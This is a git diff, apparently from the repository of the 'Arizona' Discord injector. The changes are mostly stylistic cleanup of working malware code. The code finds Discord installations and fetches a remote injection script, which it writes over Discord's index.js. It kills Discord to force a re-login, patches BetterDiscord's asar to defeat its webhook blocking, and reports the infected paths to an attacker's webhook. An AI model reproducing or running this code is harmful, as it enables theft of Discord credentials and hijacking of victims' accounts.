@@ -4,11 +4,11 @@
 /* 
     Creators: Stanley-GF & bytixo
     Project Name: Arizona
-    Languages: JS, JS (C# injectors can be found on Github)
+    Languages: JS, JS, RS (C# injectors can be found on Github)
     Contribute: https://github.com/Stanley-GF/Arizona
 */
 
-var glob = require("glob");
+const glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
@@ -23,11 +23,10 @@ const config = {
     "embed-color": "%MBEDCOLOR%1",
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
-var LOCAL = process.env.LOCALAPPDATA
-var discords = [];
-var injectPath = [];
-var runningDiscords = [];
-
+let LOCAL = process.env.LOCALAPPDATA
+let discords = [];
+let injectPath = [];
+let runningDiscords = [];
 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
@@ -42,9 +41,10 @@ discords.forEach(function(file) {
     glob.sync(pattern).map(file => {
         injectPath.push(file)
     })
-    
 });
+
 listDiscords();
+
 function Infect() {
     https.get('https://raw.githubusercontent.com/Stanley-GF/Arizona/main/src/injection/injection-clean.js', (resp) => {
         let data = '';
@@ -57,14 +57,15 @@ function Infect() {
                     encoding: 'utf8',
                     flag: 'w'
                 });
+
                 if (config["init-notify"] == "true") {
                     let init = file.replace("index.js", "init")
                     if (!fs.existsSync(init)) {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-                if ( config.logout != "false" ) {
 
+                if ( config.logout != "false" ) {
                     let folder = file.replace("index.js", "ArizonaBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
@@ -76,34 +77,19 @@ function Infect() {
                     }
                 }
             })
-            
         });
     }).on("error", (err) => {
         console.log(err);
     });
 };
 
-
 function listDiscords() {
-    exec('tasklist', function(err,stdout, stderr) {
+    exec('tasklist', function(err, stdout, stderr) {
+        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
+        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
+        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
+        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
-        
-        if (stdout.includes("Discord.exe")) {
-
-            runningDiscords.push("discord")
-        }
-        if (stdout.includes("DiscordCanary.exe")) {
-
-            runningDiscords.push("discordcanary")
-        }
-        if (stdout.includes("DiscordDevelopment.exe")) {
-
-            runningDiscords.push("discorddevelopment")
-        }
-        if (stdout.includes("DiscordPTB.exe")) {
-
-            runningDiscords.push("discordptb")
-        };
         if (config.logout == "instant") {
             killDiscord();
         } else {
@@ -114,9 +100,6 @@ function listDiscords() {
             pwnBetterDiscord()
         }
     })
-
-
-   
 };
 
 function killDiscord() {
@@ -125,8 +108,9 @@ function killDiscord() {
             if (err) {
               return;
             }
-          });
+        });
     });
+
     if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
         injectNotify();
     }
@@ -142,33 +126,31 @@ function startDiscord() {
             if (err) {
               return;
             }
-          });
+        });
     });
 };
+
 function pwnBetterDiscord() {
-    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
-        var x = fs.readFileSync(dir)
+        let x = fs.readFileSync(dir)
         fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
-    } else {
-        return;
     }
 
+    return;
 }
 
-
 function injectNotify() {
-    var fields = [];
+    let fields = [];
     injectPath.forEach( path => {
-        var c = {
+        let c = {
             name: ":syringe: Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
         fields.push(c)
     })
-    axios
-	.post(webhook, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -189,5 +171,4 @@ function injectNotify() {
 	.catch(error => {
 
     })
-
 }
